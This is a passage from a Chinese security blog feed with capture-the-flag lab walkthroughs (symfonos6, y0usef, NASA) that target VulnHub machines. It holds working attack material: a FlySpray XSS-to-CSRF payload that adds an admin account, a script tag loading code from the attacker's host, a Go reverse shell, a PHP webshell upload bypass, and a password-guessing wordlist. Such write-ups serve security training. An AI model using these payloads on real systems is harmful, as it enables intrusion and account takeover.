class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/symfonos6# gobuster dir -u http://192.168.43.95:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.43.95:3000/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     php,html,txt</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/01 07:01:38 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/img (Status: 302)</span><br><span class="line">/admin (Status: 302)</span><br><span class="line">/issues (Status: 302)</span><br><span class="line">/css (Status: 302)</span><br><span class="line">/avatars (Status: 302)</span><br><span class="line">/js (Status: 302)</span><br><span class="line">/vendor (Status: 302)</span><br><span class="line">/explore (Status: 302)</span><br><span class="line">/debug (Status: 200)</span><br><span class="line">/milestones (Status: 302)</span><br><span class="line">/notifications (Status: 302)</span><br><span class="line">/achilles (Status: 200)</span><br><span class="line">/healthcheck (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/01 07:33:30 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>



<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./symfonos6/2.png" alt></p>
<p><a href="http://192.168.43.95:3000/" target="_blank" rel="noopener">http://192.168.43.95:3000/</a></p>
<p><img data-src="./symfonos6/3.png" alt></p>
<p><a href="http://192.168.43.95/posts/" target="_blank" rel="noopener">http://192.168.43.95/posts/</a></p>
<p><img data-src="./symfonos6/4.png" alt></p>
<h3 id="flyspray"><a href="#flyspray" class="headerlink" title="flyspray"></a>flyspray</h3><ul>
<li>密码本路径扫描并未发现该路径<a href="http://192.168.43.95/flyspray/" target="_blank" rel="noopener">http://192.168.43.95/flyspray/</a> </li>
</ul>
<p><img data-src="./symfonos6/5.png" alt></p>
<ul>
<li>查找漏洞</li>
</ul>
<p><img data-src="./symfonos6/6.png" alt></p>
<p>发现存在 <code>xss</code> 问题</p>
<p>仔细查看前端发现细节</p>
<p><img data-src="./symfonos6/7.png" alt></p>
<ul>
<li>利用 <a href="https://www.exploit-db.com/exploits/41918" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41918</a></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># Exploit Title: XSRF Stored FlySpray 1.0-rc4 (XSS2CSRF add admin account)</span><br><span class="line"># Date: 19/04/2017</span><br><span class="line"># Exploit Author: Cyril Vallicari / HTTPCS / ZIWIT</span><br><span class="line">: https:<span class="comment">//www.openoffice.org</span></span><br><span class="line"># Version: 1.0-rc4</span><br><span class="line"># Tested on: Windows 7 x64 SP1 / Kali Linux</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Description :</span><br><span class="line"></span><br><span class="line">A vulnerability has been discovered <span class="keyword">in</span> Flyspray , which can be</span><br><span class="line">exploited by malicious people to conduct cross-site scripting attacks. Input</span><br><span class="line">passed via the <span class="string">'real_name'</span> parameter to <span class="string">'/index.php?do=myprofile'</span> is not</span><br><span class="line">properly sanitised before being returned to the user. This can be exploited</span><br><span class="line">to execute arbitrary HTML and script code <span class="keyword">in</span> a user<span class="string">'s browser session in</span></span><br><span class="line"><span class="string">context of an affected site.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The script is executed on the parameter page AND on any page that allow the</span></span><br><span class="line"><span class="string">user to put a comment.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This XSS vector allow to execute scripts to gather the CSRF token</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">and submit a form to create a new admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here'</span>s the script :</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tok = <span class="built_in">document</span>.getElementsByName(<span class="string">'csrftoken'</span>)[<span class="number">0</span>].value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> txt = <span class="string">'&lt;form method="POST" id="hacked_form"</span></span><br><span class="line"><span class="string">action="index.php?do=admin&amp;area=newuser"&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="action" value="admin.newuser"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="do" value="admin"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="area" value="newuser"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="user_name" value="hacker"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="csrftoken" value="'</span> + tok + <span class="string">'"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="user_pass" value="12345678"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="user_pass2" value="12345678"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="real_name" value="root"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="email_address" value="root@root.com"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="verify_email_address" value="</span></span><br><span class="line"><span class="string">root@root.com"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="jabber_id" value=""/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="notify_type" value="0"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="time_zone" value="0"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;input type="hidden" name="group_in" value="1"/&gt;'</span></span><br><span class="line">txt += <span class="string">'&lt;/form&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="built_in">document</span>.getElementById(<span class="string">'menu'</span>);</span><br><span class="line">d1.insertAdjacentHTML(<span class="string">'afterend'</span>, txt);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"hacked_form"</span>).submit();</span><br><span class="line"></span><br><span class="line">This will create a <span class="keyword">new</span> admin account, <span class="attr">hacker</span>:<span class="number">12345678</span></span><br><span class="line"></span><br><span class="line">POC video : *https:<span class="comment">//www.youtube.com/watch?v=eCf9a0QpnPs</span></span><br><span class="line"></span><br><span class="line">Patch : No patch yet</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>real name</code> <code>&quot;&gt;&lt;script src=&quot;http://192.168.43.172/exp.js&quot;&gt;&lt;/script&gt;</code></p>
</li>
<li><p>利用失败</p>
</li>
<li><p>admin”&gt;&lt;script/src=”<a href="http://192.168.43.172/&quot;&gt;" target="_blank" rel="noopener">http://192.168.43.172/&quot;&gt;</a>&lt;a/href=”</p>
</li>
</ul>
<p><img data-src="./symfonos6/8.png" alt></p>
<p><img data-src="./symfonos6/9.png" alt></p>
<p><img data-src="./symfonos6/10.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"""</span></span><br><span class="line"><span class="string">        var tok = document.getElementsByName('csrftoken')[0].value;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var txt = '&lt;form method="POST" id="hacked_form" action="index.php?do=admin&amp;area=newuser"&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="action" value="admin.newuser" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="do" value="admin" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="area" value="newuser" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="user_name" value="hacker" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="csrftoken" value="' + tok + '" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="user_pass" value="12345678" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="user_pass2" value="12345678" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="real_name" value="root" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="email_address" value="root@root.com" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="verify_email_address" value="root@root.com" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="jabber_id" value="" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="notify_type" value="0" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="time_zone" value="0" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;input type="hidden" name="group_in" value="1" /&gt;'</span></span><br><span class="line"><span class="string">            txt += '&lt;/form&gt;'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var d1 = document.getElementById('menu');</span></span><br><span class="line"><span class="string">        d1.insertAdjacentHTML('afterend', txt);</span></span><br><span class="line"><span class="string">        document.getElementById("hacked_form").submit();</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos6/11.png" alt></p>
<ul>
<li>获得高级管理员 <code>hacker / 12345678</code></li>
</ul>
<p><img data-src="./symfonos6/12.png" alt></p>
<p><img data-src="./symfonos6/13.png" alt></p>
<p><img data-src="./symfonos6/14.png" alt></p>
<ul>
<li>获得账号密码 <code>achilles / h2sBr9gryBunKdF9</code></li>
</ul>
<p>发现不能通过 <code>ssh</code> </p>
<p><img data-src="./symfonos6/15.png" alt></p>
<p>原因主要是由于 文件权限问题</p>
<h3 id="Gitea"><a href="#Gitea" class="headerlink" title="Gitea"></a>Gitea</h3><ul>
<li>登录<code>Gitea</code></li>
</ul>
<p><img data-src="./symfonos6/16.png" alt></p>
<ul>
<li>利用钩子</li>
</ul>
<p><a href="https://freebuf.com/articles/network/177699.html" target="_blank" rel="noopener">https://freebuf.com/articles/network/177699.html</a></p>
<p><img data-src="./symfonos6/17.png" alt></p>
<p><img data-src="./symfonos6/18.png" alt></p>
<ul>
<li>提交请求触发钩子</li>
</ul>
<p><img data-src="./symfonos6/19.png" alt></p>
<ul>
<li>获得<code>shell</code></li>
</ul>
<p><img data-src="./symfonos6/20.png" alt></p>
<ul>
<li>切换用户</li>
</ul>
<p><img data-src="./symfonos6/21.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img data-src="./symfonos6/22.png" alt></p>
<ul>
<li><code>go reverse shell</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"os/exec"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"net"</span>;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  con,_:=net.Dial(<span class="string">"tcp"</span>,<span class="string">"127.0.0.1:23"</span>);</span><br><span class="line">  cmd:=exec.Command(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  cmd.Stdin=con;</span><br><span class="line">  cmd.Stdout=con;</span><br><span class="line">  cmd.Stderr=con;</span><br><span class="line">  cmd.Run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos6/23.png" alt></p>
<p><img data-src="./symfonos6/24.png" alt></p>
<p>五一快乐！ 自己好菜！！！</p>
<p><img data-src="./symfonos6/25.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>symfonos</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>symfonos</tag>
      </tags>
  </entry>
  <entry>
    <title>y0usef</title>
    <url>/2021/01/01/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/y0usef/</url>
    <content><![CDATA[<h1 id="y0usef"><a href="#y0usef" class="headerlink" title="y0usef"></a>y0usef</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><p><a href="http://www.vulnhub.com/entry/y0usef-1,624/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/y0usef-1,624/</a>  2 flag</p>
<ul>
<li>kali2020</li>
<li>靶机(<a href="http://192.168.43.210/" target="_blank" rel="noopener">http://192.168.43.210/</a>)</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.42.0/16</span><br></pre></td></tr></table></figure>

<p><img data-src="./y0usef/1.png" alt></p>
<p><img data-src="./y0usef/2.png" alt></p>
<p><img data-src="./y0usef/3.png" alt></p>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A 192.168.43.210</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A 192.168.43.210</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 05:52 EST</span><br><span class="line">Nmap scan report for 192.168.43.210</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 d8:e0:99:8c:76:f1:86:a3:ce:09:c8:19:a4:1d:c7:e1 (DSA)</span><br><span class="line">|   2048 82:b0:20:bc:04:ea:3f:c2:cf:73:c3:d4:fa:b5:4b:47 (RSA)</span><br><span class="line">|   256 03:4d:b0:70:4d:cf:5a:4a:87:c3:a5:ee:84:cc:aa:cc (ECDSA)</span><br><span class="line">|_  256 64:cd:d0:af:6e:0d:20:13:01:96:3b:8d:16:3a:d6:1b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:61:9E:A4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.28 ms 192.168.43.210</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds</span><br></pre></td></tr></table></figure>

<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul>
<li>默认字典发现并没有扫描出什么东西</li>
</ul>
<p><img data-src="./y0usef/4.png" alt></p>
<ul>
<li>加大字典 貌似gg</li>
</ul>
<p><img data-src="./y0usef/5.png" alt></p>
<ul>
<li>开挂发现网上WP，后台地址为 <code>/adminstration</code> ， <code>x-forwarded-for:127.0.0.1</code> 绕过</li>
</ul>
<p><img data-src="./y0usef/6.png" alt></p>
<p><img data-src="./y0usef/7.png" alt></p>
<ul>
<li><code>post上去username和password都是admin</code></li>
</ul>
<p>弱口令</p>
<p><img data-src="./y0usef/8.png" alt></p>
<p><img data-src="./y0usef/9.png" alt></p>
<h3 id="后台测试"><a href="#后台测试" class="headerlink" title="后台测试"></a>后台测试</h3><ul>
<li>通过返回包可以看到，服务器操作系统&amp;&amp;后台语言</li>
</ul>
<p><img data-src="./y0usef/10.png" alt></p>
<ul>
<li>发现文件上传，开始上传php马</li>
</ul>
<p><img data-src="./y0usef/11.png" alt></p>
<p>这里发现文件名后缀做了限制，尝试绕<code>Content-Type: image/png</code></p>
<p><img data-src="./y0usef/12.png" alt></p>
<p><img data-src="./y0usef/13.png" alt></p>
<p>拿<code>shell</code> <code>http://192.168.43.210/adminstration/upload/files/1609497415eval.php?caixin=phpinfo();</code></p>
<p><img data-src="./y0usef/14.png" alt></p>
<ul>
<li>中国蚁剑</li>
</ul>
<p>发现一个 <code>user.txt</code> <code>home</code>目录下</p>
<p><img data-src="./y0usef/15.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 解码</span></span><br><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure>

<p><img data-src="./y0usef/16.png" alt></p>
<ul>
<li><code>ssh</code>连接(nmap 22端口)</li>
</ul>
<p><img data-src="./y0usef/17.png" alt></p>
<ul>
<li>查看<code>sudo</code>权限</li>
</ul>
<p><img data-src="./y0usef/18.png" alt></p>
<p>提权 root</p>
<p><img data-src="./y0usef/19.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx</span><br></pre></td></tr></table></figure>

<p><img data-src="./y0usef/20.png" alt></p>
<p>OVER!!!</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>y0usef</tag>
      </tags>
  </entry>
  <entry>
    <title>NASA</title>
    <url>/2022/04/17/blog_formal/security/%E9%9D%B6%E5%9C%BA/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/finish/NASA/</url>
    <content><![CDATA[<h1 id="NASA"><a href="#NASA" class="headerlink" title="NASA"></a>NASA</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一个内网的综合靶场练习，提升个人单兵能力</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li><p>kali2020</p>
</li>
<li><p>windows10</p>
</li>
<li><p>NASA</p>
</li>
</ul>
<p>备注：其中NASA基础环境拓扑图如下:</p>
<p><img data-src="./NASA/1.png" alt></p>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="web打点-ubuntu"><a href="#web打点-ubuntu" class="headerlink" title="web打点(ubuntu)"></a>web打点(ubuntu)</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
<li>首页如下</li>
</ul>
<p><img data-src="./NASA/2.png" alt></p>
<ul>
<li>端口扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">masscan -p 1-65535 192.168.59.198 --rate=500</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\moonsec\nasa&gt; masscan -p 1-65535 192.168.59.198 --rate=500</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-04-17 02:56:58 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 192.168.59.198</span><br></pre></td></tr></table></figure>

<ul>
<li>robots.txt</li>
</ul>
<p><img data-src="./NASA/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> robots.txt </span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line">User-agent: * </span><br><span class="line">Disallow: /data</span><br><span class="line">Disallow: /hook</span><br><span class="line">Disallow: /public</span><br><span class="line">Disallow: /module</span><br><span class="line">Disallow: /template</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /config.php</span><br><span class="line">Disallow: /common.php</span><br><span class="line">Disallow: /order/list</span><br></pre></td></tr></table></figure>

<ul>
<li>发现后台地址</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.59.198/admin/webadmin.php?mod=do&amp;act=login</span><br></pre></td></tr></table></figure>

<p><img data-src="./NASA/4.png" alt></p>
<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><ul>
<li>经验证，验证码可复用，后台可进行暴力破解</li>
</ul>
<p><img data-src="./NASA/5.png" alt></p>
<ul>
<li>社工密码生成<a href="https://api.xiaobaibk.com/lab/guess/" target="_blank" rel="noopener">社工密码字典在线生成 (xiaobaibk.com)</a></li>
</ul>
<p><img data-src="./NASA/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##########以下为生成的密码口令###########</span></span></span><br><span class="line">nasa</span><br><span class="line">nasa.</span><br><span class="line">NASA</span><br><span class="line">NASA.</span><br><span class="line">woaini</span><br><span class="line">woaini.</span><br><span class="line">WOAINI</span><br><span class="line">WOAINI.</span><br><span class="line">woaininasa</span><br><span class="line">woaininasa.</span><br><span class="line">520nasa</span><br><span class="line">520nasa.</span><br><span class="line">WOAINIWOAINI</span><br><span class="line">WOAINIWOAINI</span><br><span class="line">nasalovewifejp</span><br><span class="line">nasalovewifejp.</span><br><span class="line">NASALOVEWIFEJP</span><br><span class="line">NASALOVEWIFEJP.</span><br><span class="line">nasa123123</span><br><span class="line">nasa123123.</span><br><span class="line">NASA123123</span><br><span class="line">NASA123123.</span><br><span class="line">nasa123123123</span><br><span class="line">nasa123123123.</span><br><span class="line">NASA123123123</span><br><span class="line">NASA123123123.</span><br><span class="line">nasa112233</span><br><span class="line">nasa112233.</span><br><span class="line">NASA112233</span><br><span class="line">NASA112233.</span><br><span class="line">nasa445566</span><br><span class="line">nasa445566.</span><br><span class="line">NASA445566</span><br><span class="line">NASA445566.</span><br><span class="line">nasa456456</span><br><span class="line">nasa456456.</span><br><span class="line">NASA456456</span><br><span class="line">NASA456456.</span><br><span class="line">nasa778899</span><br><span class="line">nasa778899.</span><br><span class="line">NASA778899</span><br><span class="line">NASA778899.</span><br><span class="line">nasa789789</span><br><span class="line">nasa789789.</span><br><span class="line">NASA789789</span><br><span class="line">NASA789789.</span><br><span class="line">nasa321321</span><br><span class="line">nasa321321.</span><br><span class="line">NASA321321</span><br><span class="line">NASA321321.</span><br><span class="line">nasa520</span><br><span class="line">nasa520.</span><br><span class="line">NASA520</span><br><span class="line">NASA520.</span><br><span class="line">nasa1314</span><br><span class="line">nasa1314.</span><br><span class="line">NASA1314</span><br><span class="line">NASA1314.</span><br><span class="line">nasa5201314</span><br><span class="line">nasa5201314.</span><br><span class="line">NASA5201314</span><br><span class="line">NASA5201314.</span><br><span class="line">nasa1314520</span><br><span class="line">nasa1314520.</span><br><span class="line">NASA1314520</span><br><span class="line">NASA1314520.</span><br><span class="line">nasa147369</span><br><span class="line">nasa147369.</span><br><span class="line">NASA147369</span><br><span class="line">NASA147369.</span><br><span class="line">nasa258</span><br><span class="line">nasa258.</span><br><span class="line">NASA258</span><br><span class="line">NASA258.</span><br><span class="line">nasa147</span><br><span class="line">nasa147.</span><br><span class="line">NASA147</span><br><span class="line">NASA147.</span><br><span class="line">nasa456</span><br><span class="line">nasa456.</span><br><span class="line">NASA456</span><br><span class="line">NASA456.</span><br><span class="line">nasa789</span><br><span class="line">nasa789.</span><br><span class="line">NASA789</span><br><span class="line">NASA789.</span><br><span class="line">nasa147258369</span><br><span class="line">nasa147258369.</span><br><span class="line">NASA147258369</span><br><span class="line">NASA147258369.</span><br><span class="line">nasa111222</span><br><span class="line">nasa111222.</span><br><span class="line">NASA111222</span><br><span class="line">NASA111222.</span><br><span class="line">nasa1</span><br><span class="line">nasa1.</span><br><span class="line">NASA1</span><br><span class="line">NASA1.</span><br><span class="line">nasa12</span><br><span class="line">nasa12.</span><br><span class="line">NASA12</span><br><span class="line">NASA12.</span><br><span class="line">nasa123</span><br><span class="line">nasa123.</span><br><span class="line">NASA123</span><br><span class="line">NASA123.</span><br><span class="line">nasa1234</span><br><span class="line">nasa1234.</span><br><span class="line">NASA1234</span><br><span class="line">NASA1234.</span><br><span class="line">nasa123456</span><br><span class="line">nasa123456.</span><br><span class="line">NASA123456</span><br><span class="line">NASA123456.</span><br><span class="line">nasa1234567</span><br><span class="line">nasa1234567.</span><br><span class="line">NASA1234567</span><br><span class="line">NASA1234567.</span><br><span class="line">nasa12345678</span><br><span class="line">nasa12345678.</span><br><span class="line">NASA12345678</span><br><span class="line">NASA12345678.</span><br><span class="line">nasa123456789</span><br><span class="line">nasa123456789.</span><br><span class="line">NASA123456789</span><br><span class="line">NASA123456789.</span><br><span class="line">nasa987654321</span><br><span class="line">nasa978654321.</span><br><span class="line">NASA978654321</span><br><span class="line">NASA978654321.</span><br><span class="line">nasa87654321</span><br><span class="line">nasa78654321.</span><br><span class="line">NASA78654321</span><br><span class="line">NASA78654321.</span><br><span class="line">nasa7654321</span><br><span class="line">nasa8654321.</span><br><span class="line">NASA8654321</span><br><span class="line">NASA8654321.</span><br><span class="line">nasa654321</span><br><span class="line">nasa654321.</span><br><span class="line">NASA654321</span><br><span class="line">NASA654321.</span><br><span class="line">nasa54321</span><br><span class="line">nasa54321.</span><br><span class="line">NASA54321</span><br><span class="line">NASA54321.</span><br><span class="line">nasa4321</span><br><span class="line">nasa4321.</span><br><span class="line">NASA4321</span><br><span class="line">NASA4321.</span><br><span class="line">nasa321</span><br><span class="line">nasa321.</span><br><span class="line">NASA321</span><br><span class="line">NASA321.</span><br><span class="line">nasa21</span><br><span class="line">nasa21.</span><br><span class="line">NASA21</span><br><span class="line">NASA21.</span><br><span class="line">nasa11</span><br><span class="line">nasa11.</span><br><span class="line">NASA11</span><br><span class="line">NASA11.</span><br><span class="line">nasa111</span><br><span class="line">nasa111.</span><br><span class="line">NASA111</span><br><span class="line">NASA111.</span><br><span class="line">nasa1111</span><br><span class="line">nasa1111.</span><br><span class="line">NASA1111</span><br><span class="line">NASA1111.</span><br><span class="line">nasa11111</span><br><span class="line">nasa11111.</span><br><span class="line">NASA11111</span><br><span class="line">NASA11111.</span><br><span class="line">nasa111111</span><br><span class="line">nasa111111.</span><br><span class="line">NASA111111</span><br><span class="line">NASA111111.</span><br><span class="line">nasa1111111</span><br><span class="line">nasa1111111.</span><br><span class="line">NASA1111111</span><br><span class="line">NASA1111111.</span><br><span class="line">nasa11111111</span><br><span class="line">nasa11111111.</span><br><span class="line">NASA11111111</span><br><span class="line">NASA11111111.</span><br><span class="line">nasa2</span><br><span class="line">nasa2.</span><br><span class="line">NASA2</span><br><span class="line">NASA2.</span><br><span class="line">nasa22</span><br><span class="line">nasa22.</span><br><span class="line">NASA22</span><br><span class="line">NASA22.</span><br><span class="line">nasa222</span><br><span class="line">nasa222.</span><br><span class="line">NASA222</span><br><span class="line">NASA222.</span><br><span class="line">nasa2222</span><br><span class="line">nasa2222.</span><br><span class="line">NASA2222</span><br><span class="line">NASA2222.</span><br><span class="line">nasa22222</span><br><span class="line">nasa22222.</span><br><span class="line">NASA22222</span><br><span class="line">NASA22222.</span><br><span class="line">nasa222222</span><br><span class="line">nasa222222.</span><br><span class="line">NASA222222</span><br><span class="line">NASA222222.</span><br><span class="line">nasa2222222</span><br><span class="line">nasa2222222.</span><br><span class="line">NASA2222222</span><br><span class="line">NASA2222222.</span><br><span class="line">nasa22222222</span><br><span class="line">nasa22222222.</span><br><span class="line">NASA22222222</span><br><span class="line">NASA22222222.</span><br><span class="line">nasa33</span><br><span class="line">nasa33.</span><br><span class="line">NASA33</span><br><span class="line">NASA33.</span><br><span class="line">nasa333</span><br><span class="line">nasa333.</span><br><span class="line">NASA333</span><br><span class="line">NASA333.</span><br><span class="line">nasa3333</span><br><span 